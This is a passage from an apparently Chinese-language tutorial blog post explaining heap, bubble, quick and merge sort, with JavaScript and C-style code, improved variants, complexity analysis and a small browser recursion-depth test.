class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 排序思路：（升序）</span></span><br><span class="line"><span class="comment"> * 将堆根保存于尾部，并对剩余序列调用调整函数，调整完成后，再将最大跟保存于尾部-1（-1，-2，...，-i），</span></span><br><span class="line"><span class="comment"> * 再对剩余序列进行调整，反复进行该过程，直至排序完成。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 将最大的元素调整到堆顶*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AdjustHeap</span>(<span class="params">arr, pos, len</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> swap = arr[pos];      <span class="comment">//保存当前节点</span></span><br><span class="line">    <span class="keyword">let</span> child = pos * <span class="number">2</span> + <span class="number">1</span>;  <span class="comment">//定位到当前节点的左边的子节点</span></span><br><span class="line">    <span class="keyword">while</span>(child &lt; len)&#123;       <span class="comment">//递归遍历所有的子节点</span></span><br><span class="line">        <span class="comment">//判断当前节点是否有右节点，若右节点较大，就采用右节点和当前节点进行比较</span></span><br><span class="line">        <span class="keyword">if</span>(child + <span class="number">1</span> &lt; len &amp;&amp; arr[child] &lt; arr[child + <span class="number">1</span>])&#123;</span><br><span class="line">            child += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//比较当前节点和最大的子节点，小于就交换，交换后将当前节点定位到子节点上</span></span><br><span class="line">        <span class="keyword">if</span>(arr[pos] &lt; arr[child])&#123;          </span><br><span class="line">            arr[pos]=arr[child];        </span><br><span class="line">            pos = child;</span><br><span class="line">            child = pos * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        arr[pos] = swap;</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 构建堆：</span></span><br><span class="line"><span class="comment"> * 满足：树中任一非叶子结点的关键字均不大于（或不小于）其左右孩子结点的关键字。</span></span><br><span class="line"><span class="comment"> * 实现：从最后一个拥有子节点的节点开始，将该节点和其他节点进行比较，将最大的数交换给该节点，</span></span><br><span class="line"><span class="comment"> *      交换后再依次向前节点进行相同的交换处理，直到构建出大顶堆。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">BuildHeap</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> len =arr.length;</span><br><span class="line">    <span class="keyword">let</span> n= <span class="built_in">Math</span>.floor((len<span class="number">-1</span>)/<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=n; i&gt;=<span class="number">0</span>; i--)&#123;  <span class="comment">//构建大顶堆</span></span><br><span class="line">        AdjustHeap(arr, i, arr.length);<span class="comment">//从第一个非叶子结点从下至上，从右至左调整结构</span></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*堆排序算法*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HeapSort</span>(<span class="params">arr</span>)</span>&#123;</span><br><span class="line">    BuildHeap(arr); <span class="comment">//构建堆</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=arr.length<span class="number">-1</span>; i&gt;<span class="number">0</span>; i--)&#123;   <span class="comment">//从数组的尾部进行调整</span></span><br><span class="line">        <span class="keyword">let</span> swap = arr[i];  <span class="comment">//堆顶永远是最大的元素,将堆顶和尾部元素交换，最大元素就保存在尾部，并且不参与后面的调整</span></span><br><span class="line">        arr[i] = arr[<span class="number">0</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = swap;</span><br><span class="line">        AdjustHeap(arr, <span class="number">0</span>, i); <span class="comment">//重新对堆进行调整</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">46</span>,<span class="number">12</span>,<span class="number">33</span>,<span class="number">72</span>,<span class="number">68</span>,<span class="number">19</span>,<span class="number">80</span>,<span class="number">33</span>,<span class="number">1</span>];</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">46</span>,<span class="number">12</span>,<span class="number">33</span>,<span class="number">72</span>,<span class="number">68</span>,<span class="number">19</span>,<span class="number">80</span>,<span class="number">33</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'before: '</span> + arr);</span><br><span class="line">HeapSort(arr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">' after: '</span> + arr);</span><br></pre></td></tr></table></figure>
<p>分析:<br>堆排序是一种选择排序，整体主要由构建初始堆+交换堆顶元素和末尾元素并重建堆两部分组成。其中构建初始堆经推导复杂度为O(n)，在交换并重建堆的过程中，需交换n-1次，而重建堆的过程中，根据完全二叉树的性质，[log2(n-1),log2(n-2)…1]逐步递减，近似为nlogn。所以堆排序时间复杂度一般认为就是O(nlogn)级。</p>
<p>设树深度为k，k=floor(logn)+1 。从根到叶的筛选，元素比较次数至多2(k-1)次，交换记录至多k 次。所以，在建好堆后，排序过程中的筛选次数不超过下式：<br> <img src="/study/2018/9/8-sort/heap_sort_3.png"><br>而建堆时的比较次数不超过4n 次，因此堆排序最坏情况下，时间复杂度也为：O(nlogn )。</p>
<h2 id="交换排序—冒泡排序（Bubble-Sort）（下沉）"><a href="#交换排序—冒泡排序（Bubble-Sort）（下沉）" class="headerlink" title="交换排序—冒泡排序（Bubble Sort）（下沉）"></a>交换排序—冒泡排序（Bubble Sort）（下沉）</h2><h4 id="基本思想：-3"><a href="#基本思想：-3" class="headerlink" title="基本思想："></a>基本思想：</h4><p>在要排序的一组数中，对当前还未排好序的范围内的全部数，自上而下对相邻的两个数依次进行比较和调整，让较大的数往下沉，较小的往上冒。即：每当两相邻的数比较后发现它们的排序与排序要求相反时，就将它们互换。</p>
<p>冒泡排序的示例：<br><img src="/study/2018/9/8-sort/bubble_sort.png"></p>
<h4 id="算法的实现：-2"><a href="#算法的实现：-2" class="headerlink" title="算法的实现："></a>算法的实现：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> bubbleSort(int a[], int n)&#123; </span><br><span class="line"><span class="keyword">for</span>(int i =<span class="number">0</span> ; i&lt; n<span class="number">-1</span>; ++i) &#123; <span class="comment">//i只是次数</span></span><br><span class="line">    <span class="keyword">for</span>(int j = <span class="number">0</span>; j &lt; n-i<span class="number">-1</span>; ++j) &#123; </span><br><span class="line">        <span class="keyword">if</span>(a[j] &gt; a[j+<span class="number">1</span>]) &#123; </span><br><span class="line">        int tmp = a[j] ;</span><br><span class="line">         a[j] = a[j+<span class="number">1</span>] ; </span><br><span class="line">         a[j+<span class="number">1</span>] = tmp; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="冒泡排序算法的改进"><a href="#冒泡排序算法的改进" class="headerlink" title="冒泡排序算法的改进"></a>冒泡排序算法的改进</h4><p>对冒泡排序常见的改进方法是加入一标志性变量<code>exchange</code>，用于标志某一趟排序过程中是否有数据交换，如果进行某一趟排序时并没有进行数据交换，则说明数据已经按要求排列好，可立即结束排序，避免不必要的比较过程。本文再提供以下两种改进算法：</p>
<ol>
<li>设置一标志性变量pos,用于记录每趟排序中最后一次进行交换的位置。由于<strong>pos位置之后的记录均已交换到位</strong>,故在进行下一趟排序时只要扫描到pos位置即可。</li>
</ol>
<p>改进后算法如下:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Bubble_1 ( int r[], int n) &#123; </span><br><span class="line">int i= n <span class="number">-1</span>; <span class="comment">//初始时,最后位置保持不变 </span></span><br><span class="line"><span class="keyword">while</span> ( i&gt; <span class="number">0</span>) &#123; </span><br><span class="line">    int pos= <span class="number">0</span>; <span class="comment">//每趟开始时,无记录交换 </span></span><br><span class="line">    <span class="keyword">for</span> (int j= <span class="number">0</span>; j&lt; i; j++) </span><br><span class="line">    <span class="keyword">if</span> (r[j]&gt; r[j+<span class="number">1</span>]) &#123; </span><br><span class="line">        pos= j; <span class="comment">//记录交换的位置 </span></span><br><span class="line">        int tmp = r[j]; r[j]=r[j+<span class="number">1</span>];r[j+<span class="number">1</span>]=tmp; </span><br><span class="line">    &#125; </span><br><span class="line">    i= pos; <span class="comment">//为下一趟排序作准备 </span></span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<ol>
<li>传统冒泡排序中每一趟排序操作只能找到一个最大值或最小值,我们考虑利用在每趟排序中进行正向和反向两遍冒泡的方法一次可以得到两个最终值(最大者和最小者) , 从而使排序趟数几乎减少了一半。</li>
</ol>
<p>改进后的算法实现为:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> Bubble_2 ( int r[], int n)&#123; </span><br><span class="line">    int low = <span class="number">0</span>; </span><br><span class="line">    int high= n <span class="number">-1</span>; <span class="comment">//设置变量的初始值 </span></span><br><span class="line">    int tmp,j; </span><br><span class="line">    <span class="keyword">while</span> (low &lt; high) &#123; </span><br><span class="line">        <span class="keyword">for</span> (j= low; j&lt; high; ++j)&#123; <span class="comment">//正向冒泡,找到最大者 </span></span><br><span class="line">            <span class="keyword">if</span> (r[j]&gt; r[j+<span class="number">1</span>]) &#123; </span><br><span class="line">            tmp = r[j]; r[j]=r[j+<span class="number">1</span>];r[j+<span class="number">1</span>]=tmp; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        --high; <span class="comment">//修改high值, 前移一位 </span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ( j=high; j&gt;low; --j)&#123; <span class="comment">//反向冒泡,找到最小者 </span></span><br><span class="line">            <span class="keyword">if</span> (r[j]&lt;r[j<span class="number">-1</span>]) &#123; </span><br><span class="line">                tmp = r[j]; r[j]=r[j<span class="number">-1</span>];r[j<span class="number">-1</span>]=tmp; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125;</span><br><span class="line">        ++low; <span class="comment">//修改low值,后移一位 </span></span><br><span class="line">        </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="交换排序—快速排序（Quick-Sort）"><a href="#交换排序—快速排序（Quick-Sort）" class="headerlink" title="交换排序—快速排序（Quick Sort）"></a>交换排序—快速排序（Quick Sort）</h2><h4 id="基本思想：-4"><a href="#基本思想：-4" class="headerlink" title="基本思想："></a>基本思想：</h4><pre><code>1）选择一个基准元素,通常选择第一个元素或者最后一个元素。
2）通过一趟排序将待排序的记录分割成独立的两部分，其中一部分记录的元素值均比基准元素值小。另一部分记录的 元素值比基准值大。
3）此时基准元素在其排好序后的正确位置。
4）然后分别对这两部分记录用同样的方法继续进行排序，直到整个序列有序。
</code></pre><p>快速排序的示例：</p>
<p>（a）一趟排序的过程：<br> <img src="/study/2018/9/8-sort/bubble_sort_1.png"></p>
<p>（b）排序的全过程<br>  <img src="/study/2018/9/8-sort/bubble_sort_2.png"></p>
<img src="/study/2018/9/8-sort/quick_sort.png">
<h4 id="算法的实现：-3"><a href="#算法的实现：-3" class="headerlink" title="算法的实现："></a>算法的实现：</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">swap</span>(<span class="params">s,t</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">let</span> tmp = a[s];</span><br><span class="line">    a[s]=a[t];</span><br><span class="line">    a[t]=tmp; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">partition</span>(<span class="params">a,low, high</span>) </span>&#123; </span><br><span class="line">    <span class="keyword">let</span> privotIndex=low;</span><br><span class="line">    <span class="keyword">let</span> privotKey = a[low]; <span class="comment">//基准元素 </span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high)&#123; <span class="comment">//从表的两端交替地向中间扫描 </span></span><br><span class="line">        <span class="keyword">while</span>(low &lt; high &amp;&amp; a[high] &gt;= privotKey) --high; </span><br><span class="line">        <span class="keyword">while</span>(low &lt; high &amp;&amp; a[low] &lt;= privotKey ) ++low; </span><br><span class="line">        <span class="keyword">if</span>(low &lt; high) swap(low, high); </span><br><span class="line">    &#125; </span><br><span class="line">    swap(low,privotIndex)</span><br><span class="line">    <span class="keyword">return</span> low; <span class="comment">//这里low和high相等</span></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">quickSort</span>(<span class="params">a, low, high</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(low &lt; high)&#123; </span><br><span class="line">        <span class="keyword">let</span> privotLoc = partition(a, low, high); <span class="comment">//将表一分为二 </span></span><br><span class="line">        quickSort(a, low, privotLoc <span class="number">-1</span>); <span class="comment">//递归对低子表递归排序 </span></span><br><span class="line">        quickSort(a, privotLoc + <span class="number">1</span>, high); <span class="comment">//递归对高子表递归排序 </span></span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> a= [<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">8</span>]; </span><br><span class="line">quickSort(a,<span class="number">0</span>,a.length<span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>快速排序是通常被认为在同数量级（O(nlog2n)）的排序方法中平均性能最好的。但若初始序列按关键码有序或基本有序时，快排序反而蜕化为冒泡排序。为改进之，通常以“三者取中法”来选取基准记录，即将排序区间的两个端点与中点三个记录关键码居中的调整为支点记录。快速排序是一个<code>不稳定</code>的排序方法。</p>
<h4 id="快速排序的改进"><a href="#快速排序的改进" class="headerlink" title="快速排序的改进"></a>快速排序的改进</h4><p>在本改进算法中,只对长度大于k的子序列递归调用快速排序,让原序列基本有序，然后再对整个基本有序序列用插入排序算法排序。实践证明，改进后的算法时间复杂度有所降低，且当k取值为 8 左右时,改进算法的性能最佳。算法思想如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> print(int a[], int n)&#123; </span><br><span class="line"><span class="keyword">for</span>(int j= <span class="number">0</span>; j&lt;n; j++)&#123; </span><br><span class="line">cout&lt;&lt;a[j] &lt;&lt;<span class="string">" "</span>; </span><br><span class="line">&#125; </span><br><span class="line">cout&lt;&lt;endl; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> swap(int *a, int *b) </span><br><span class="line">&#123; </span><br><span class="line">int tmp = *a; </span><br><span class="line">*a = *b; </span><br><span class="line">*b = tmp; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">int partition(int a[], int low, int high) &#123; </span><br><span class="line">    int privotKey = a[low]; <span class="comment">//基准元素 </span></span><br><span class="line">    <span class="keyword">while</span>(low &lt; high)&#123; <span class="comment">//从表的两端交替地向中间扫描 </span></span><br><span class="line">        <span class="keyword">while</span>(low &lt; high &amp;&amp; a[high] &gt;= privotKey) --high; <span class="comment">//从high 所指位置向前搜索，至多到low+1 位置。将比基准元素小的交换到低端 </span></span><br><span class="line">        swap(&amp;a[low], &amp;a[high]); </span><br><span class="line">        <span class="keyword">while</span>(low &lt; high &amp;&amp; a[low] &lt;= privotKey ) ++low; </span><br><span class="line">        swap(&amp;a[low], &amp;a[high]); </span><br><span class="line">    &#125; </span><br><span class="line">    print(a,<span class="number">10</span>); </span><br><span class="line">    <span class="keyword">return</span> low; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> qsort_improve(int r[ ],int low,int high, int k)&#123; </span><br><span class="line">    <span class="keyword">if</span>( high -low &gt; k ) &#123; <span class="comment">//长度大于k时递归, k为指定的数 </span></span><br><span class="line">        int pivot = partition(r, low, high); <span class="comment">// 调用的Partition算法保持不变 </span></span><br><span class="line">        qsort_improve(r, low, pivot - <span class="number">1</span>,k); </span><br><span class="line">        qsort_improve(r, pivot + <span class="number">1</span>, high,k); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">void</span> quickSort(int r[], int n, int k)&#123; </span><br><span class="line">    qsort_improve(r,<span class="number">0</span>,n,k);<span class="comment">//先调用改进算法Qsort使之基本有序 </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//再用插入排序对基本有序序列排序 </span></span><br><span class="line">    <span class="keyword">for</span>(int i=<span class="number">1</span>; i&lt;=n;i ++)&#123; </span><br><span class="line">        int tmp = r[i]; </span><br><span class="line">        int j=i<span class="number">-1</span>; </span><br><span class="line">        <span class="keyword">while</span>(tmp &lt; r[j])&#123; </span><br><span class="line">            r[j+<span class="number">1</span>]=r[j]; j=j<span class="number">-1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        r[j+<span class="number">1</span>] = tmp; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">int main()&#123; </span><br><span class="line">int a[<span class="number">10</span>] = &#123;<span class="number">3</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">10</span>,<span class="number">8</span>&#125;; </span><br><span class="line">cout&lt;&lt;<span class="string">"初始值："</span>; </span><br><span class="line">print(a,<span class="number">10</span>); </span><br><span class="line">quickSort(a,<span class="number">9</span>,<span class="number">4</span>); </span><br><span class="line">cout&lt;&lt;<span class="string">"结果："</span>; </span><br><span class="line">print(a,<span class="number">10</span>); </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="归并排序（Merge-Sort）"><a href="#归并排序（Merge-Sort）" class="headerlink" title="归并排序（Merge Sort）"></a>归并排序（Merge Sort）</h2><h4 id="基本思想：-5"><a href="#基本思想：-5" class="headerlink" title="基本思想："></a>基本思想：</h4><p>归并（Merge）排序法是将两个（或两个以上）有序表合并成一个新的有序表，即把待排序序列分为若干个子序列，每个子序列是有序的。然后再把有序子序列合并为整体有序序列。</p>
<p>归并排序示例：<br> <img src="/study/2018/9/8-sort/merge_sort.png"></p>
 <img src="/study/2018/9/8-sort/merge_sort2.png">
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> tmp = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (left.length &amp;&amp; right.length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (left[<span class="number">0</span>] &lt; right[<span class="number">0</span>])</span><br><span class="line">      tmp.push(left.shift());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      tmp.push(right.shift());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tmp.concat(left, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a.length === <span class="number">1</span>) </span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> mid = ~~(a.length / <span class="number">2</span>)</span><br><span class="line">    , left = a.slice(<span class="number">0</span>, mid)</span><br><span class="line">    , right = a.slice(mid);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> merge(mergeSort(left), mergeSort(right));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段合并排序的代码相当简单直观，但是mergeSort()函数会导致很频繁的自调用。一个长度为n的数组最终会调用mergeSort() 2*n-1次，这意味着如果需要排序的数组长度很大会在某些栈小的浏览器上发生栈溢出错误。</p>
<p>这里插个话题，关于递归调用时浏览器的栈大小限制，可以用代码去测试：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> cnt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    cnt++;</span><br><span class="line">    <span class="built_in">arguments</span>.callee();</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.message, cnt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// chrome: Maximum call stack size exceeded 35992</span></span><br><span class="line"><span class="comment">// firefox: too much recursion 11953</span></span><br></pre></td></tr></table></figure></p>
<p>遇到栈溢出错误并不一定要修改整个算法，只是表明递归不是最好的实现方式。这个合并排序算法同样可以迭代实现，比如（摘抄自《高性能JavaScript》）：</p>
<h4 id="归并的迭代算法"><a href="#归并的迭代算法" class="headerlink" title="归并的迭代算法"></a>归并的迭代算法</h4><p>1个元素的表总是有序的。所以对n 个元素的待排序列，每个元素可看成1 个有序子表。对子表两两合并生成n/2个子表，所得子表除最后一个子表长度可能为1 外，其余子表长度均为2。再进行两两合并，直到生成n 个元素按关键码有序的表。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">left, right</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (left.length &amp;&amp; right.length) &#123;</span><br><span class="line">    <span class="keyword">if</span> (left[<span class="number">0</span>] &lt; right[<span class="number">0</span>])</span><br><span class="line">      result.push(left.shift());</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      result.push(right.shift());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result.concat(left, right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mergeSort</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (a.length === <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> work = [];</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, len = a.length; i &lt; len; i++)</span><br><span class="line">    work.push([a[i]]);</span><br><span class="line"></span><br><span class="line">  work.push([]); <span class="comment">// 如果数组长度为奇数!!</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> lim = len; lim &gt; <span class="number">1</span>; lim = ~~((lim + <span class="number">1</span>) / <span class="number">2</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> j = <span class="number">0</span>, k = <span class="number">0</span>; k &lt; lim; j++, k += <span class="number">2</span>) <span class="comment">//k &lt; lim</span></span><br><span class="line">      work[j] = merge(work[k], work[k + <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    work[j] = []; <span class="comment">// 如果数组长度为奇数!!</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> work[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(mergeSort([<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">4</span>]));</span><br></pre></td></tr></table></figure></p>
